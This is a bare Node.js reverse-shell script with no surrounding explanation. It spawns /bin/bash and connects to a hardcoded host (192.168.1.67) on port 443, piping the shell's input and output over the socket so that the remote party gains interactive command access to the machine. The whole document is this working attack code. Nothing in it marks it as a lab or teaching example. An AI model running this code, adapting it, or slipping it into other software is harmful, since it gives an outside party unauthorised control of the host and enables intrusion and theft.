const net = require('net');
const { spawn } = require('child_process');

const REMOTE_HOST = '192.168.1.67';
const REMOTE_PORT = 443;

const shell = spawn('/bin/bash', []);

const client = new net.Socket();

client.connect(REMOTE_PORT, REMOTE_HOST, () => {
    client.pipe(shell.stdin);
    shell.stdout.pipe(client);
    shell.stderr.pipe(client);
});

client.on('close', () => {
    try { shell.kill(); } catch (e) { /* ignore */ }
});

client.on('error', (err) => {
    console.error('Socket error:', err.message);
    try { shell.kill(); } catch (e) { }
});